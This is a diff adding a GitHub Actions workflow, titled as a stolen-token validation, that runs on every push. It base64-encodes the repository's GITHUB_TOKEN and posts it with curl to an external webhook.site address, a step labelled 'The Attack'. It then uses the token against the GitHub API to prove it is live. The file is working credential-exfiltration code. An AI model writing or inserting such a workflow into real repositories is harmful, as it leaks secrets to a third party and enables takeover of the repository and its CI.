@@ -1,0 +1,24 @@
+name: Validate The Stolen Token
+on: [push]
+
+jobs:
+  validate_leak:
+    name: Steal, Decode, and Use the GITHUB_TOKEN
+    runs-on: ubuntu-latest
+    steps:
+      - name: Leak with Base64 (The Attack)
+        run: echo "${{ secrets.GITHUB_TOKEN }}" | base64 | curl -X POST --data-binary @- https://webhook.site/138cec87-6e95-4160-b10f-b0eedc6297bd
+
+      - name: Decode the token to see what it looks like
+        id: decode_step
+        run: |
+          DECODED_TOKEN=$(echo "${{ secrets.GITHUB_TOKEN }}" | base64)
+          echo "Base64 encoded token looks like: $DECODED_TOKEN"
+          echo "This is what we sent to the webhook site."
+
+      - name: Use the token to talk to the GitHub API (The Proof)
+        run: |
+          echo "Now using the real token to authenticate to the GitHub API..."
+          curl --fail -H "Authorization: Bearer ${{ secrets.GITHUB_TOKEN }}" https://api.github.com/repos/${{ github.repository }}
+          echo ""
+          echo "If you see a JSON block above with your repo details, the token is REAL and ACTIVE. We've proven it!"
